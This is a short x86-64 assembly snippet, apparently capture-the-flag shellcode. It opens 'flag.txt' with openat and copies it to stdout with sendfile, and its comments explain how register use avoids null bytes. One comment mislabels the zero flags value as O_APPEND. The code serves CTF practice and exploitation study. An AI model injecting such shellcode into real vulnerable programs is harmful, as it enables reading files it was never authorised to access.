global _start
section .text
_start:
    xor rax, rax                ; set rax to 0
    push rax
    mov ax,257                  ; sys_openat
                                ; we need 2 bytes to represent 257.
                                ; using al will overflow
                                ; ax is for byte 0-1 (2 bytes).
    mov rdi,-100                ; dirfd (-100 is AT_FDCWD)
    mov r8, "flag.txt"
    push r8
    lea rsi,[rsp]
    xor rdx,rdx                 ; flag O_APPEND
    syscall

    mov rsi,rax                 ; save the returned fd
    xor rax, rax                ; set rax to 0
    mov al,0x28                 ; sys_sendfile
    xor rdi, rdi                ; set rdi to 0
    mov dil,0x1                 ; set rdi to fd 1 (stdout)
    xor rdx,rdx                 ; 0 offset
    mov r10b,255                  ; size_t_count
    syscall
